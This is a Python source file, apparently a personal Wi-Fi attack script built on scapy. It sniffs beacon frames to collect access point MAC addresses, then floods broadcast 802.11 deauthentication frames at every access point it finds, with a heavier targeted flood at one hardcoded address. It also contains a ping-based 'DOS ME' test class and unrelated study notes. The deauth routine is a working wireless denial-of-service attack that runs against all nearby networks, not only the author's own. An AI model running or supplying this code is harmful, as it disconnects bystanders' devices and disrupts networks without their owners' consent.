# WIFI SCANNER  // DEAUTH MODULE // THIS WILL HOLD MALICIOUS LOGIC MEANT FOR ETHICAL REASONS


# UI IMPORTS
import pywifi.iface
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.console import Console
console = Console()

# NETWORK IMPORTS
import pywifi, socket, ipaddress
from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth



# ETC IMPORTS 
import threading, os, random, time, pyttsx3

    
# THINGS TO STUDY FOR MATH ASVAB 
MATH = ["percentage", "algebra", "PEMDAS", "Area & Distance", "regular to fraction", "factor equations", "angle of triangle", "area and volume"]


for m in MATH:
    console.print(m)
print("\n\n")



# RUN THIS FOR NOW TO BEGIN DEAUTH MODULE
# sudo ./.venv/bin/python nsm_deauth.py

class Frame_Snatcher():
    """This class will be responsible for sniffing out frames and or pulling mac address"""


    macs = []   
    beacons = []


    def __init__(self):
        pass


    
    
    @classmethod
    def packet_parser(cls, pkt):
        """This method will be called upon to then parse the given packet"""



        # COLORS
        c1 = "yellow"
        c2 = "bold red"
        c3 = "bold blue"
        c4 = "bold green"





        # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
        if pkt.haslayer(Dot11Beacon):


            addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else "No"
            addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else "No"


             

            if addr1 not in cls.macs and addr1 != "No":

                # ADD MAC
                cls.macs.append(addr1)
                console.print(f"[{c2}][+] Found a new mac addr1:[{c4}] {addr1}")

            
            if addr2 not in cls.macs and addr2 != "No":

                # ADD MAC
                cls.macs.append(addr2)
                console.print(f"[{c2}][+] Found Mac addr:[{c4}] {addr2}")



    
    @classmethod
    def sniffer_scapy(cls, iface="wlan0", verbose=1, timeout=15):
        """This method will be used to sniff out mac addresses using the sniff function"""

        # COUNT THE ATTEMPTS
        tempt = 1   


        # LOOP THAT BITCH
        while True:

            
            # OUTPUT ATTEMPT
            console.print(f"Sniff Attempt #{tempt}", style="bold green")

                
            # SNIFF THAT BITCH
            sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
            
            # APPEND TEMPT
            tempt += 1

            
            # KEEP LOOPING UNTIL TRUE
            if cls.macs:
                break


        go = 100


        if cls.macs:

            while go >= 0:
                for mac in cls.macs:

                #threading.Thread(target=Deauth_You.death_all, args=("ff:ff:ff:ff:ff:ff", mac), daemon=True).start()

                    Deauth_You.death_all(client_mac="ff:ff:ff:ff:ff:ff", ap_mac=mac)
                    time.sleep(.5)

                    go -= 1


                    console.print(f"[bold red]Loop #:[bold blue] {go}")
        

        else:
            console.print("Failed to capture macs / frames", style="bold red")



class Deauth_You():
    """This module will be responsible for crafting and sending deauth packets"""

    # CLASS VARS
    captures = {}



    def __init__(self):
        pass



    @classmethod
    def death_all(cls, client_mac, ap_mac, iface="wlan0", verbose=1, inter=0, packets=500):
        """This method will be used to send deauth frames to any and all devices found within the area"""

        
        try:

            # CREATE THE DEAUTH FRAME
            reasons = random.choice([7,4,5,15])
            dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)  # ADDR1 = RECIEVER ADDR2 = SENDER, ADDR3 = REAL AP
            frame = RadioTap() / dot11 / Dot11Deauth(reason=reasons)  # REASON = THE REASON THERE BEING KICKED OFF


            # NOW TO SEND THE FRAME
            console.print(ap_mac)
            
            if ap_mac.strip() == "aa:95:dd:e8:c5:53":

                
                loop = 1

                while loop <= 100: 

                    # RECREATE FRAME
                    reasons = random.choice([7,4,5,15])
                    frame = RadioTap() / dot11 / Dot11Deauth(reason=reasons) / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)

                    sendp(frame, iface=iface, verbose=verbose, inter=0.1, count=25)

                    console.print(f"Performing Targeted Deauth #{loop}", style="bold green")

                    loop += 1
            
            else:

               # while loop < 30:
                sendp(frame, iface=iface, verbose=verbose, inter=inter, count=packets)

                   # loop += 1
    

            console.print(f"Frames Successfully sent", style="bold green")
        
        
        except OSError as e:
            console.print(f"[bold red]Deauth OS Error:[yellow] {e}")


        except Exception as e:
            console.print(f"[bold red]Exception Error:[yellow] {e}")

    
    @classmethod
    def packet_parser(cls, pkt, type=2):
        "This method is responsible for crafting the actual deauth packets"

        
        # YOUR MONITOR MODE INTERFACE
        iface = 'wlan1mon'
        

        # COLORS
        c1 = "bold red"
        c2 = "bold green"
        c3 = "bold blue"
        c4 = "bold yellow"
        

        # CHECK IF ITS A DOT11 PACKET
        if type == 1:
            if pkt.haslayer(Dot11):
                console.print(f"[{c1}][+] Packet:[{c2}] {pkt.addr1} [{c4}]--> [{c2}] {pkt.addr2}")
        

        # FOR BEACON FRAMES
        elif type == 2:
            if pkt.haslayer(Dot11Beacon):
                

                if pkt.addr2 == "3E:6E:B6:08:E3:1F":
                    console.print(f"Iphone found: {pkt.addr2}", style="bold green")




# THIS CLASS IS STRICTLY TO BE USED AS A VICTIM NODE TO TEST IF THIS MODULE IS FUNCTIONAL 
class You_Cant_DOS_ME():
    """This is testing ground for weather or not i can withstand a ddos attack"""


    def __init__(self):
        pass


    @classmethod
    def ping(cls, host="google.com", timeout=4, verbose=False):
        """Create the ping packet and send it out"""


        # PRINT WELCOME
        text = pyfiglet.figlet_format(text="DOS\n ME", font="bloody")
        console.print(text, style="bold red")

        console.input("\n[bold red]ARE U READY ?: ")
        
        online = True
        pings = 0

        # TALK SHII FOR FUN
        talks = [
            "You can't hit me offline — I host the cloud.",
            "Yawn... I'm still online.",
            "Your net too slow to even scan me.",
            "My packets run laps around yours.",
            "Bro I deauth for fun.",
            "Your IP is giving home router energy.",
            "My Wi-Fi's got better uptime than your excuses.",
            "I don't lag — I throttle reality.",
            "My ping is lower than your standards.",
            "Try harder... I'm behind 3 VPNs and your girl’s Wi-Fi.",
            "You scan ports, I open wormholes.",
            "Your whole setup runs on hope and Starbucks Wi-Fi.",
            "Deauth me? I deauth back with feelings.",
            "Nice packet — shame it never reached me.",
            "You can’t trace me — I lost myself years ago."
        ]


        try:
            
            # CREATE PACKET AND GET HOST
            ip = socket.gethostbyname(str(host))
            console.print(IP)
            ping = IP(dst=ip) / ICMP()

            
            # ERROR CHECK
            console.print(ping)
            time.sleep(3)
        
        except Exception as e:
            console.print(f"[bold red]Socket Exception Error: {e}")
            
            
        # LOOP THAT BITCH
        while online:

            try:
            
                # TRACK PING TIME
                time_start = time.time()
                response = sr1(ping, timeout=timeout, verbose=verbose)

                time_took = time.time() - time_start

                
                if response:
                    console.print(f"[bold blue]Connection Status: [bold green]Online  -  Ping Latency: {time_took:.2f}")
                

                else:
                    console.print(f"[bold blue]Connection Status: [bold red]Offline  -  I HATE YOU")



                    

                
                pings += 1 
                if time_took < 1.0:
                    time.sleep(1.5)


                ran = random.randint(0,10)

                if ran == 4:

                    console.print(talks[random.randint(0,14)])


                
        

            except Exception as e:

                # SET ONLINE TO FALSE
                console.print(f"[bold red]Exception Error: {e}")




# FOR MODULE TESTING
if __name__ == "__main__":

    use = 1


    if use == 1:
        Frame_Snatcher.sniffer_scapy()
    


    if use == 3:
        You_Cant_DOS_ME.ping()


